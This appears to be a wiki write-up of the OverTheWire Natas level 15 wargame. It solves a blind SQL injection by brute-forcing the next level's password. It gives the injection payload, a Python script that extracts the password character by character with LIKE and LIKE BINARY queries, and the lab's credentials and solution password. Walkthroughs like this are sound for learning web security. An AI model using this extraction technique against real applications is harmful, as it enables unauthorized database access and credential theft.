[Category:OverTheWire-Natas](/Category:OverTheWire-Natas "wikilink")
Username: natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J URL:
<http://natas15.natas.labs.overthewire.org>

this is a challenge because we dont see any output but we can sql inject
it we first see if there is a user natas16 and there is so then we try
the query natas16" and password like "a%";-- this result in cant find it

we iterate over it until we have the right password case insensitive.
natas16" and password like "b%";-- natas16" and password like "c%";--

that would be

waiheacj63wnnibroheqi3p9t0m5nhmh

we then look up how to make it case sensitive then we see if w is valid
if not then at that place the char is W natas16" and password like
Binary "w%";--

we do this to speed up the brute force attack.

`  `
`import requests`
`  `
`# password = 'waiheacj63wnnibroheqi3p9t0m5nhmh'`
`  `
`# for i in range(32):`
`#     for char in "abcdefghijklmnopqrstuvwxyz0123456789":`
`#         querystring = 'natas16" and password like "{}%";-- '.format(password+str(char))`
`#         print(querystring)`
`#         r = requests.post('http://natas15.natas.labs.overthewire.org', auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),data={'username':querystring})`
`#         if('This user exists' in r.text):`
`#             password += str(char)`
`#             print(password)`
`  `
`  `
`  `
`  `
`password = 'waiheacj63wnnibroheqi3p9t0m5nhmh'`
`  `
`for i in range(32):`
`    print(i)`
`    querystring = 'natas16" and password like Binary "{}%";-- '.format(password[:i+1])`
`    print(querystring)`
`    r = requests.post('http://natas15.natas.labs.overthewire.org', auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),data={'username':querystring})`
`    if('This user doesn\'t exist' in r.text):`
`        x = list(password)`
`        x[i] = x[i].upper()`
`  `
`        password = "".join(x)`
`        print(password)`
`  `

result : WaIHEacj63wnNIBROHeqi3p9t0m5nhmh